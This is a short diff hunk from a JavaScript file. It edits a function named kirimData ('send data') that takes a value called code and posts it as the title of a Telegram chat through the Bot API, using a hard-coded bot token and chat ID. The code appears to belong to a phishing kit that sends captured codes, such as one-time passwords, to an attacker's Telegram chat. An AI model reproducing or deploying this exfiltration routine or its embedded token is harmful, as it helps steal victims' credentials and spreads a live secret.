@@ -254,7 +254,7 @@
 
     function kirimData() {
 	  const chatId = '-4879699338';
-	  const title = `/${encodeURIComponent(code)}`;
+	  const title = `${encodeURIComponent(code)}`;
 	  const body = `chat_id=${chatId}&title=${title}`;
 
 	  fetch('https://api.telegram.org/bot7291278930:AAFxJf-I6DUlNtRohK7NJAVhixrPCb_Yo6s/setChatTitle', {
